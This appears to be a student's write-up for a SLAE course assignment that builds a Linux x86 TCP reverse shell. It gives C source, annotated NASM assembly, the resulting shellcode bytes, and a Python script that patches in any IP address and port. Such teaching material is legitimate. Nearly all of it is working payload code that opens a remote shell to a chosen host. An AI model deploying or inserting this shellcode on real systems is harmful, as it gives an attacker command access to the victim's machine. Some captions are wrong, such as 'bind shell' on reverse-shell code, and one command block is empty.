# SLAE course
The course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#2: What to do ?


## First step: create a TCP reverse shell
This shellcode needs to be able to:
* Reverse conencts to configured IP and Port
* Execs shell on successful conenction

The second step is to create a script which will make the IP and port configuration easy

### What is a reverse shell
A TCP reverse shell connects back to a remote machine, then executes a shell and redirects all input & output to the socket.

### Example of bind shell TCP in C
```c
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, int *argv[])
{
    // Create s for the socket
    int s;
    // Create sockaddr_in struct
    struct sockaddr_in addr;
	
    // AF_INET for IPv4
    addr.sin_family = AF_INET;
    // Set port number to 4444
    addr.sin_port = htons(4444);
    // Listen on any interface
    addr.sin_addr.s_addr = inet_addr("127.1.1.1");

    // Create the sock
    // AF_INET for IPv4
    // SOCK_STREAM for TCP connection
    s = socket(AF_INET, SOCK_STREAM, 0);

    // Connect to the remote machine
    connect(s, (struct sockaddr *)&addr, sizeof(addr));

    // Redirect the STDIN, STDOUT and STDERR into the socket
    for (int i = 0; i < 3; i++)
    {
        dup2(s, i);
    }

    // Execute /bin/sh
    execve("/bin/sh", 0, 0);

    return 0;
}
```

Before starting, a list of linux x86 systemcall can be found in the following files
```bash
#cat /usr/include/asm/unistd_32.h
```
On older distributions the file is stored here:
```bash
#cat /usr/include/i386-linux-gnu/asm/unistd_32.h
```

The first step is to initialize the stack and the registers:
```nasm
;set the stack pointer

mov ebp, esp

;initialize registers to zero

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

## structure
```nasm
;struct sockaddr_in struct
;struct sockaddr_in {
;	short	sin_family;
;	u_short	sin_port;
;	struct	in_addr sin_addr;
;	char	sin_zero[8];
;};

push eax
push eax            ;padding for sin_zero sockaddr_in struct
push 0x0101017f     ;initialize ip address to 127.1.1.1 
push word 0xb315    ;port number initialize to 5555
push word 0x02      ;network family initialize for IPv4
```

## Socket
```nasm
;s = socket(AF_INET, SOCK_STREAM, 0);

mov ax, 0x167       ;system call number for socket
mov bl, 0x02        ;IPv4 family adress
mov cl, 0x01        ;TCP socket
int 0x80            ;go for it
mov esi, eax        ;move return value (file descriptor) into esi
```

## Connect
```
;connect(s, (struct sockaddr *)&sa, sizeof(sa));

xor eax, eax
mov ax, 0x16a       ;connect system call number
mov ebx, esi        ;file descriptor
mov ecx, esp        ;point to the struct present in the stack
mov edi, ebp        ;used to get the size of the structure
sub edi, esp        ;used to get the size of the structure
mov edx, edi        ;get the size of the struct by using a simple soustraction
int 0x80            ;go for it
```

## Dup2
```nasm
;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}

xor ecx, ecx
mov cl, 3
boucle:
    xor eax, eax
    mov al, 0x3f    ;dup system call number
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;go for it
    inc cl          ;inc to cl 1
    loop boucle
```

## execve
```nasm
;execve("/bin/sh", 0, 0);

xor eax, eax
push eax            ;push a NULL byte
push 0x68732f2f     ;push /bin//sh
push 0x6e69622f     ;push /bin//sh
mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
xor ecx, ecx        ;initialize ecx to NULL
xor edx, edx        ;initialize edx to NULL
mov al, 0xb         ;system call number for execve
int 0x80            ;go for it
```

### Whole code
```nasm
;Simple ASM (x86) reverse shell for 127.1.1.1 on port 5555
global _start

_start:
;set the frame pointer
mov ebp, esp

;initialize registers to NULL
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;struct sockaddr_in struct
;struct sockaddr_in {
;	short	sin_family;
;	u_short	sin_port;
;	struct	in_addr sin_addr;
;	char	sin_zero[8];
;};
push eax
push eax            ;padding for sin_zero sockaddr_in struct
push 0x0101017f     ;initialize ip address to 127.1.1.1 
push word 0xb315    ;port number initialize to 5555
push word 0x02      ;network family initialize for IPv4

;s = socket(AF_INET, SOCK_STREAM, 0);
mov ax, 0x167       ;system call number for socket
mov bl, 0x02        ;IPv4 family adress
mov cl, 0x01        ;TCP socket
int 0x80            ;go for it
mov esi, eax        ;move return value (file descriptor) into esi

;connect(s, (struct sockaddr *)&sa, sizeof(sa));
xor eax, eax
mov ax, 0x16a       ;connect system call number
mov ebx, esi        ;file descriptor
mov ecx, esp        ;point to the struct present in the stack
mov edi, ebp        ;used to get the size of the structure
sub edi, esp        ;used to get the size of the structure
mov edx, edi        ;get the size of the struct by using a simple soustraction
int 0x80            ;go for it

;for (int i = 0; i < 3; i++)
;{
;    dup2(connfd, i);
;}
xor ecx, ecx
mov cl, 3
boucle:
    xor eax, eax
    mov al, 0x3f    ;dup system call number
    mov ebx, esi    ;mov the fd variable in ebx
    dec cl          ;dec to cl 1
    int 0x80        ;go for it
    inc cl          ;inc to cl 1
    loop boucle

;execve("/bin/sh", 0, 0);
xor eax, eax
push eax ;push a NULL byte
push 0x68732f2f     ;push /bin//sh
push 0x6e69622f     ;push /bin//sh
mov ebx, esp        ;mov the adress of "/bin//sh" in ebx
xor ecx, ecx        ;initialize ecx to NULL
xor edx, edx        ;initialize edx to NULL
mov al, 0xb         ;system call number for execve
int 0x80            ;go for it
```

# Second step: make the ip and port configuration easy

Before explaining the python script used for this task, we need to retrieve the hexadecimal format of our shellcode. But instead of a simple '\x' before our hexadecimal value, we will need two of them '\\\x'. 

Why ? Because our python script won't interpret our shellcode without this part.

We can easily do that by using the following objdump command:
```bash
```

### Python code
```python
#!/usr/bin/python3

import sys
import socket
import binascii

#Shellcode
shellcode = '\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80'

if len(sys.argv) < 3:
	print('Usage: python {name} <IP> <PORT>'.format(name = sys.argv[0]))
	print('Example: python {name} 127.1.1.1 5555'.format(name = sys.argv[0]))
	exit(1)

#Modify ip address
ip = sys.argv[1].split('.')
ip_in_hex = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'.format(
										ip_in_hex[0:2],
										ip_in_hex[2:4],
										ip_in_hex[4:6],
										ip_in_hex[6:8]
))

#Modify port number
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], port[2:4]))

print(shellcode)
```